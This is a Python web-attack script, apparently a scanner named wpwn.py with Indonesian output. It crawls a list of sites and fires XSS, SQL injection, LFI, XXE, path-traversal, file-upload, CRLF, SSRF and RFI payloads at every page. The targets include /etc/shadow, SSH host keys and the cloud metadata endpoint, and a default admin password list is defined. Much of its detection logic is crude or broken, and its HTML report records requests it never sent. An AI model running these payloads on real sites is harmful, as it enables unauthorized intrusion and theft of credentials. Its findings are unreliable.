import requests
import sys
import time
import threading
from bs4 import BeautifulSoup
import atexit

# Global variable to store results
results = {}

def read_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
    return [url.strip() for url in urls]

def crawl(url):
    print(f"\n[!] Mencrawl URL: {url}")
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            links = set()
            for a_tag in soup.find_all('a', href=True):
                link = a_tag['href']
                if link.startswith('/'):
                    link = url + link
                elif not link.startswith('http'):
                    continue
                links.add(link)
            print(f"[*] Ditemukan {len(links)} tautan di {url}.")
            return links
        else:
            print(f"[!] Gagal mengakses {url} - Status code: {response.status_code}")
            return set()
    except requests.exceptions.RequestException as e:
        print(f"[!] Error saat mencrawl {url}: {e}")
        return set()

def save_results_to_html(filename, results):
    with open(filename, 'w') as f:
        f.write("<html><head><title>Hasil Pengujian Kerentanan</title></head><body>")
        f.write("<h1>Hasil Pengujian Kerentanan</h1>")
        f.write("<table border='1'><tr><th>URL</th><th>Kerentanan</th><th>Request</th><th>Response</th></tr>")
        
        for url, vulnerabilities in results.items():
            for vulnerability in vulnerabilities['details']:
                f.write(f"<tr><td>{url}</td><td>{vulnerability['type']}</td><td><pre>{vulnerability['request']}</pre></td><td><pre>{vulnerability['response']}</pre></td></tr>")
        
        f.write("</table></body></html>")
    print(f"[*] Hasil disimpan ke {filename}")

def checkwaf(url):
    try:
        sc = requests.get(url, timeout=5)
        if sc.status_code != 200:
            print("[!] Error with status code:", sc.status_code)
            return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Error checking WAF for {url}: {e}")
        return False

    noise = "?=<script>alert()</script>"
    fuzz = url + noise

    try:
        waffd = requests.get(fuzz, timeout=5)
        if waffd.status_code in [406, 501, 999, 419, 403]:
            print("[\033[1;31m!\033[0;0m] WAF Detected.")
            return True
        else:
            print("[*] No WAF Detected.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Error checking WAF response for {url}: {e}")
        return False

def banner(url):
    try:
        sc = requests.get(url, timeout=5)
        if sc.status_code != 200:
            print("[!] Error with status code:", sc.status_code)
            return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching banner for {url}: {e}")
        return False

    print(f"\nBanner for {url}: {sc.headers.get('Server', 'N/A')}")
    return True

def header(url):
    try:
        h = requests.get(url, timeout=5)
        he = h.headers
        print("Server:", he.get('server', 'N/A'))
        print("Data:", he.get('date', 'N/A'))
        print("Powered:", he.get('x-powered-by', 'N/A'))
        print("\n")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching headers for {url}: {e}")
        return False

def xss_(url):
    paydone = []
    payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    '"><img src=x onerror=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<iframe src=javascript:alert("XSS")>',
    '<div style="xss:expression(alert("XSS"))">',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert("XSS")">',
    '<a href="javascript:alert("XSS")">Click me</a>',
    '<input type="button" value="XSS" onclick="alert("XSS")">',
    '<textarea>XSS</textarea>',
    '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+">',
    '<style>body {background: url("javascript:alert("XSS")");}</style>',
    '<img src="javascript:alert("XSS")">',
    '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+">',
    '<img src="http://example.com/xss.php?q=<script>alert("XSS")</script>">',
    '<img src="http://example.com/xss.php?q=<img src=x onerror=alert("XSS")>">',
    '<img src="http://example.com/xss.php?q=<svg/onload=alert("XSS")>">',
    '<img src="http://example.com/xss.php?q=<body onload=alert("XSS")>">',
    '<img src="http://example.com/xss.php?q=<iframe src=javascript:alert("XSS")>">',
    '<img src="http://example.com/xss.php?q=<div style="xss:expression(alert("XSS"))">">',
    '<img src="http://example.com/xss.php?q=<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+">">'
]
    print("[!] Testing XSS")

    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            input_elements = soup.find_all(['input', 'textarea', 'select'])
            for input_elem in input_elements:
                if 'name' in input_elem.attrs:
                    input_name = input_elem['name']
                    for pl in payloads:
                        test_url = f"{url}?{input_name}={requests.utils.quote(pl)}"
                        req = requests.get(test_url, timeout=5)
                        if pl in req.text:
                            paydone.append(pl)
                            print("[*] Vulnerable to XSS with payload:", pl)
    except requests.exceptions.RequestException as e:
        print(f"[!] XSS test failed: {e}")
    
    return paydone

def sql_(url):
    print("\n[!] Testing SQL Injection")
    payloads = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' OR ''='",
    "' OR 'x'='x",
    "' OR 1=1#",
    "' OR 'x'='x#",
    "' OR 1=1/*",
    "' OR 'x'='x/*",
    "' OR '1'='1' OR ''='",
    "' OR '1'='1' OR 'x'='x",
    "' OR '1'='1' OR ''='' OR '1'='1'",
    "' OR '1'='1' OR ''='' OR ''=''",
    "' OR '1'='1' OR ''='' OR 'x'='x",
    "' OR '1'='1' OR ''='' OR ''='' OR '1'='1'",
    "' OR '1'='1' OR ''='' OR ''='' OR ''=''",
    "' OR '1'='1' OR ''='' OR ''='' OR 'x'='x",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR '1'='1'",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''=''",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR 'x'='x",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR '1'='1'",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''=''",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR 'x'='x",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR '1'='1'",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''=''",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR 'x'='x",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR '1'='1'",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''=''",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR 'x'='x",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR '1'='1'",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''=''",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR 'x'='x",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR '1'='1'",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''=''",
    "' OR '1'='1' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR ''='' OR 'x'='x"
]
    for payload in payloads:
        try:
            req = requests.get(url + '?param=' + payload, timeout=5)
            if "mysql_fetch_array()" in req.text or "error" in req.text.lower():
                print(f"[*] Vulnerable to SQL Injection with payload: {payload}!")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] SQL Injection test failed: {e}")
    return False

def lfi_injection(url):
    print("\n[!] Testing Local File Inclusion (LFI)")
    payloads = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/aliases',
    '/etc/anacrontab',
    '/etc/apache2/apache2.conf',
    '/etc/apache2/httpd.conf',
    '/etc/at.allow',
    '/etc/at.deny',
    '/etc/bashrc',
    '/etc/bootptab',
    '/etc/chrootUsers',
    '/etc/chttp.conf',
    '/etc/cron.allow',
    '/etc/cron.deny',
    '/etc/crontab',
    '/etc/cups/cupsd.conf',
    '/etc/exports',
    '/etc/fstab',
    '/etc/ftpaccess',
    '/etc/ftpchroot',
    '/etc/ftphosts',
    '/etc/groups',
    '/etc/grub.conf',
    '/etc/hosts',
    '/etc/hosts.allow',
    '/etc/hosts.deny',
    '/etc/httpd/access.conf',
    '/etc/httpd/conf/httpd.conf',
    '/etc/httpd/httpd.conf',
    '/etc/httpd/logs/access_log',
    '/etc/httpd/logs/access.log',
    '/etc/httpd/logs/error_log',
    '/etc/httpd/logs/error.log',
    '/etc/httpd/php.ini',
    '/etc/httpd/srm.conf',
    '/etc/inetd.conf',
    '/etc/inittab',
    '/etc/issue',
    '/etc/lighttpd.conf',
    '/etc/lilo.conf',
    '/etc/logrotate.d/ftp',
    '/etc/logrotate.d/proftpd',
    '/etc/logrotate.d/vsftpd.log',
    '/etc/lsb-release',
    '/etc/motd',
    '/etc/modules.conf',
    '/etc/motd',
    '/etc/mtab',
    '/etc/my.cnf',
    '/etc/my.conf',
    '/etc/mysql/my.cnf',
    '/etc/network/interfaces',
    '/etc/networks',
    '/etc/npasswd',
    '/etc/passwd',
    '/etc/php4.4/fcgi/php.ini',
    '/etc/php4/apache2/php.ini',
    '/etc/php4/apache/php.ini',
    '/etc/php4/cgi/php.ini',
    '/etc/php4/apache2/php.ini',
    '/etc/php5/apache2/php.ini',
    '/etc/php5/apache/php.ini',
    '/etc/php/apache2/php.ini',
    '/etc/php/apache/php.ini',
    '/etc/php/cgi/php.ini',
    '/etc/php.ini',
    '/etc/php/php4/php.ini',
    '/etc/php/php.ini',
    '/etc/printcap',
    '/etc/profile',
    '/etc/proftp.conf',
    '/etc/proftpd/proftpd.conf',
    '/etc/pure-ftpd.conf',
    '/etc/pureftpd.passwd',
    '/etc/pureftpd.pdb',
    '/etc/pure-ftpd/pure-ftpd.conf',
    '/etc/pure-ftpd/pure-ftpd.pdb',
    '/etc/pure-ftpd/putreftpd.pdb',
    '/etc/redhat-release',
    '/etc/resolv.conf',
    '/etc/samba/smb.conf',
    '/etc/snmpd.conf',
    '/etc/ssh/ssh_config',
    '/etc/ssh/sshd_config',
    '/etc/ssh/ssh_host_dsa_key',
    '/etc/ssh/ssh_host_dsa_key.pub',
    '/etc/ssh/ssh_host_key',
    '/etc/ssh/ssh_host_key.pub',
    '/etc/sysconfig/network',
    '/etc/syslog.conf',
    '/etc/termcap',
    '/etc/vhcs2/proftpd/proftpd.conf',
    '/etc/vsftpd.chroot_list',
    '/etc/vsftpd.conf',
    '/etc/vsftpd/vsftpd.conf',
    '/etc/wu-ftpd/ftpaccess',
    '/etc/wu-ftpd/ftphosts',
    '/etc/wu-ftpd/ftpusers'
]
    
    for payload in payloads:
        try:
            req = requests.get(url + '?file=' + payload, timeout=5)
            if "root:x:0:0" in req.text or "error" in req.text.lower():
                print(f"[*] Vulnerable to LFI with payload: {payload}!")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] LFI test failed for payload {payload}: {e}")
    
    return False

def xst_(url):
    print("\n[!] Testing Cross Site Tracing (XST)")
    headers = {"Test": "Hello_Word", "User-Agent": "Mozilla/5.0"}
    try:
        req = requests.get(url, headers=headers, timeout=5)
        if "Hello_Word" in req.text:
            print("[*] Vulnerable to Cross Site Tracing (XST)!")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] XST test failed for {url}: {e}")

    return False

def crlf_injection(url):
    print("\n[!] Testing CRLF Injection")
    payload = [
        "%0D%0AInjected-Header: test",
        "%0AHeader-Test:BLATRUC",
        "%0A%20Header-Test:BLATRUC",
        "%20%0AHeader-Test:BLATRUC",
        "%23%OAHeader-Test:BLATRUC",
        "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
        "%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
        "%3F%0AHeader-Test:BLATRUC",
        "crlf%0AHeader-Test:BLATRUC",
        "crlf%0A%20Header-Test:BLATRUC",
        "crlf%20%0AHeader-Test:BLATRUC",
        "crlf%23%OAHeader-Test:BLATRUC",
        "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
        "crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
        "crlf%3F%0AHeader-Test:BLATRUC",
        "%0DHeader-Test:BLATRUC",
        "%0D%20Header-Test:BLATRUC",
        "%20%0DHeader-Test:BLATRUC",
        "%23%0DHeader-Test:BLATRUC",
        "%23%0AHeader-Test:BLATRUC",
        "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
        "%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
        "%3F%0DHeader-Test:BLATRUC",
        "crlf%0DHeader-Test:BLATRUC",
        "crlf%0D%20Header-Test:BLATRUC",
        "crlf%20%0DHeader-Test:BLATRUC",
        "crlf%23%0DHeader-Test:BLATRUC",
        "crlf%23%0AHeader-Test:BLATRUC",
        "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
        "crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
        "crlf%3F%0DHeader-Test:BLATRUC",
        "%0D%0AHeader-Test:BLATRUC",
        "%0D%0A%20Header-Test:BLATRUC",
        "%20%0D%0AHeader-Test:BLATRUC",
        "%23%0D%0AHeader-Test:BLATRUC",
        "\\r\\nHeader-Test:BLATRUC",
        " \\r\\n Header-Test:BLATRUC",
        "\\r\\n Header-Test:BLATRUC",
        "%5cr%5cnHeader-Test:BLATRUC",
        "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
        "%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
        "%3F%0D%0AHeader-Test:BLATRUC",
        "crlf%0D%0AHeader-Test:BLATRUC",
        "crlf%0D%0A%20Header-Test:BLATRUC",
        "crlf%20%0D%0AHeader-Test:BLATRUC",
        "crlf%23%0D%0AHeader-Test:BLATRUC",
        "crlf\\r\\nHeader-Test:BLATRUC",
        "crlf%5cr%5cnHeader-Test:BLATRUC",
        "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
        "crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
        "crlf%3F%0D%0AHeader-Test:BLATRUC",
        "%0D%0A%09Header-Test:BLATRUC",
        "crlf%0D%0A%09Header-Test:BLATRUC",
        "%250AHeader-Test:BLATRUC",
        "%25250AHeader-Test:BLATRUC",
        "%%0A0AHeader-Test:BLATRUC",
        "%25%30AHeader-Test:BLATRUC",
        "%25%30%61Header-Test:BLATRUC",
        "%u000AHeader-Test:BLATRUC",
        "//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC",
        "/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC",
        "/google.com/%2F..%0D%0AHeader-Test:BLATRUC"
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Test-Header': 'test' + '\n'.join(payload)  # Menggabungkan setiap string dalam payload dengan newline
    }
    
    try:
        req = requests.get(url, headers=headers, timeout=5)
        if "Injected-Header: test" in req.text:
            print("[*] Vulnerable to CRLF Injection!")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] CRLF Injection test failed for {url}: {e}")

    return False

def upload_injection(url):
    print("\n[!] Testing File Upload Vulnerability")
    payloads = [
        ("malicious.php", "<?php echo 'Hacked!'; ?>"),
        ("malicious.jsp", "<% out.println('Hacked!'); %>")
    ]

    for filename, content in payloads:
        files = {'file': (filename, content)}
        try:
            req = requests.post(url, files=files, timeout=5)
            if "Hacked!" in req.text:
                print(f"[*] Vulnerable to file upload with {filename}!")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] File upload test failed for {filename}: {e}")

    return False

def xxe_injection(url):
    print("\n[!] Testing XML External Entity (XXE) Injection")
    payload = '''<?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <foo>&xxe;</foo>'''
    
    headers = {'Content-Type': 'application/xml'}
    try:
        req = requests.post(url, data=payload, headers=headers, timeout=5)
        if "root:x:0:0" in req.text:
            print("[*] Vulnerable to XXE Injection!")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] XXE Injection test failed for {url}: {e}")

    return False

def path_traversal(url):
    print("\n[!] Testing Path Traversal")
    payloads = ['../../etc/passwd', '../../../../etc/shadow']
    
    for payload in payloads:
        try:
            req = requests.get(url + '?file=' + payload, timeout=5)
            if "root:x:0:0" in req.text or "error" in req.text.lower():
                print(f"[*] Vulnerable to Path Traversal with payload: {payload}!")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] Path Traversal test failed for payload {payload}: {e}")

    return False

def ssrf_injection(url):
    print("\n[!] Menguji SSRF Injection")

    payloads = [
        'http://localhost',
        'http://127.0.0.1',
        'http://169.254.169.254/latest/meta-data/',
        'http://example.com',
        'http://myexternalapi.com/resource'
    ]

    for payload in payloads:
        try:
            test_url = url + '?url=' + payload
            req = requests.get(test_url, timeout=5)
            if req.status_code == 200:
                print(f"[*] SSRF berhasil dengan payload: {payload}!")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] Uji SSRF gagal untuk payload {payload}: {e}")

    return False

def rfi_injection(url):
    print("\n[!] Menguji Remote File Inclusion (RFI)")
    
    payload = "http://example.com/malicious.txt"  # Ganti dengan URL file yang ingin diuji

    try:
        req = requests.get(url + '?file=' + payload, timeout=5)
        if "malicious content" in req.text:  # Ganti dengan konten yang diharapkan dari file yang disertakan
            print(f"[*] RFI berhasil dengan payload: {payload}!")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Uji RFI gagal untuk payload {payload}: {e}")

    return False

def security_misconfiguration(url):
    print("\n[!] Menguji Security Misconfiguration")
    
    security_headers = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection',
        'Content-Security-Policy',
        'Strict-Transport-Security',
        'Referrer-Policy',
        'Feature-Policy'
    ]

    try:
        req = requests.get(url, timeout=5)
        headers = req.headers

        for header in security_headers:
            if header not in headers:
                print(f"[!] Header keamanan hilang: {header} - Sebaiknya tambahkan header ini untuk meningkatkan keamanan.")
            else:
                print(f"[*] Header keamanan ditemukan: {header}")

        sensitive_files = [
            '/config.php',
            '/.env',
            '/web.config',
            '/app/config/config.php'
        ]

        for file in sensitive_files:
            test_url = url + file
            resp = requests.get(test_url, timeout=5)
            if resp.status_code == 200:
                print(f"[!] File sensitif dapat diakses: {test_url} - Ini bisa menjadi risiko keamanan.")
            else:
                print(f"[*] File sensitif tidak dapat diakses: {test_url} (Status code: {resp.status_code})")

    except requests.exceptions.RequestException as e:
        print(f"[!] Uji Security Misconfiguration gagal: {e}")

def rpo_attack(url):
    print("\n[!] Menguji RPO Attack")

    payloads = [
        {
            "method": "maliciousMethod",
            "params": ["maliciousParam"],
            "id": 1
        },
        {
            "method": "anotherMaliciousMethod",
            "params": ["anotherParam"],
            "id": 2
        }
    ]

    for payload in payloads:
        try:
            req = requests.post(url, json=payload, timeout=5)
            if req.status_code == 200:
                print("[*] RPO Attack berhasil! Respons:", req.json())
                return True
            else:
                print(f"[!] RPO Attack gagal. Status code: {req.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Uji RPO Attack gagal: {e}")

    return False

def race_condition(url):
    print("\n[!] Menguji Race Condition")

    def send_request():
        try:
            req = requests.get(url, timeout=5)
            print(f"[+] Respons dari {url}: {req.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Permintaan gagal: {e}")

    threads = []
    for _ in range(20):  # Meningkatkan jumlah permintaan yang ingin dikirim
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("[*] Pengujian Race Condition selesai.")

# Fungsi untuk menyimpan hasil sebelum keluar
def save_results():
    if results:
        save_results_to_html(filename, results)

# Mendaftarkan fungsi save_results untuk dipanggil saat program berakhir
atexit.register(save_results)

# Kode utama
try:
    arvs = sys.argv
    file_path = arvs[1]  # Mengambil argumen pertama setelah nama skrip
except IndexError:
    print("Penggunaan: python3 wpwn.py <file_path>")
    sys.exit(1)

# Definisikan username dan password_list
username = "admin"  # Ganti dengan username yang ingin diuji
password_list = ["password123", "123456", "admin", "letmein"]  # Ganti dengan daftar password yang ingin diuji

urls = read_urls_from_file(file_path)

# Menggunakan crawler untuk mendapatkan semua tautan dari halaman
all_urls = set()

for url in urls:
    if 'http' not in url:
        continue
    crawled_links = crawl(url)
    all_urls.update(crawled_links)

# Mengambil nama file dari file_path untuk menyimpan hasil
filename = file_path.split('/')[-1].replace('.txt', '') + "_results.html"

# Mengumpulkan hasil kerentanan
try:
    for url in all_urls:
        vulnerabilities = {'details': []}
        timing1 = time.time()
        
        if checkwaf(url):
            vulnerabilities['details'].append({"type": "WAF Detected", "request": "", "response": ""})
        if banner(url):
            vulnerabilities['details'].append({"type": "Banner Found", "request": "", "response": ""})
        if header(url):
            vulnerabilities['details'].append({"type": "Headers Checked", "request": "", "response": ""})
        
        # Menguji kerentanan lainnya
        xss_results = xss_(url)
        for pl in xss_results:
            vulnerabilities['details'].append({"type": "XSS Vulnerability Detected", "request": f'GET {url}?param={pl}', "response": "Response containing XSS payload"})
        
        if sql_(url):
            vulnerabilities['details'].append({"type": "SQL Injection Detected", "request": f'GET {url}?param=%27+OR+%271%27=%271', "response": "Response indicating SQL error"})
        
        if lfi_injection(url):
            vulnerabilities['details'].append({"type": "LFI Vulnerability Detected", "request": f'GET {url}?file=../etc/passwd', "response": "Response containing /etc/passwd content"})
        
        if xst_(url):
            vulnerabilities['details'].append({"type": "XST Vulnerability Detected", "request": f'GET {url}', "response": "Response containing XST payload"})
        
        if crlf_injection(url):
            vulnerabilities['details'].append({"type": "CRLF Injection Detected", "request": f'GET {url}', "response": "Response indicating CRLF injection"})
        
        if upload_injection(url):
            vulnerabilities['details'].append({"type": "File Upload Vulnerability Detected", "request": f'POST {url} with malicious file', "response": "Response indicating upload success"})
        
        if xxe_injection(url):
            vulnerabilities['details'].append({"type": "XXE Vulnerability Detected", "request": "POST with XML payload", "response": "Response containing /etc/passwd content"})
        
        if path_traversal(url):
            vulnerabilities['details'].append({"type": "Path Traversal Detected", "request": f'GET {url}?file=../../etc/passwd', "response": "Response containing /etc/passwd content"})
        
        if ssrf_injection(url):
            vulnerabilities['details'].append({"type": "SSRF Vulnerability Detected", "request": f'GET {url}?url=http://localhost', "response": "Response from localhost"})
        
        if rfi_injection(url):
            vulnerabilities['details'].append({"type": "RFI Vulnerability Detected", "request": f'GET {url}?file=http://example.com/malicious.txt', "response": "Response indicating RFI success"})
        
        if security_misconfiguration(url):
            vulnerabilities['details'].append({"type": "Security Misconfiguration Detected", "request": f'GET {url}', "response": "Response with missing security headers"})
        
        if rpo_attack(url):
            vulnerabilities['details'].append({"type": "RPO Attack Detected", "request": "POST with malicious method", "response": "Response indicating RPO success"})
        
        if race_condition(url):
            vulnerabilities['details'].append({"type": "Race Condition Detected", "request": f'GET {url}', "response": "Response from multiple threads"})

        if vulnerabilities['details']:
            results[url] = vulnerabilities
        
        timing2 = time.time()
        timet = timing2 - timing1
        print("\n[!] Waktu yang digunakan:", int(timet), "detik.\n")
except Exception as e:
    print(f"[!] Terjadi kesalahan: {e}")
finally:
    save_results()  # Pastikan hasil disimpan jika terjadi error
